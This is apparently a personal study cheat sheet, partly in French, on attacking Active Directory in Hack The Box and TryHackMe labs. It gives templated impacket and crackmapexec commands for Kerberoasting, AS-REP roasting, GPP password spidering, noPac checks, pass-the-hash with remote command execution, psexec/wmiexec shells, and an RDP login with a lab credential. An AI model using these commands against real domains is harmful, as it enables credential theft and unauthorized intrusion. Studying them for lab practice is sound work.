## Bases LDAP

https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html

# Doc AD:

https://ntlm.info/
https://beta.hackndo.com/pass-the-hash/#protocole-ntlm

https://zer1t0.gitlab.io/posts/attacking_ad/

## SMB enumeration /Kerberoasting

- `impacket` : 
	- check Kerberoasting: GetUserSPNs.py 
	- check AsRepRoasting: GetUserNPUs.py ([UAC values](https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/))


[Box Active (HTB)](https://0xdf.gitlab.io/2018/12/08/htb-active.html)

Synchroniser l'horloge:

`sudo ntpdate <ip>`

- `crackmapexec`:
	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): `cme smb <DC.local> -u <user> -p <pass> -M spider_plus`
	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <DC.local> -u <user> -p <pass> -M Maq`
	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`

## Shell

`psexec.py <DC>/<user>:<pass>@<DC.local>`

`wmiexec.py <DC>/<user>@<DC.local> -hashes ':<nthash>'`

## FreeRDP2

(TryHackMe AD Basics)

```bash
xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
```

![](./thm_rdp.png)
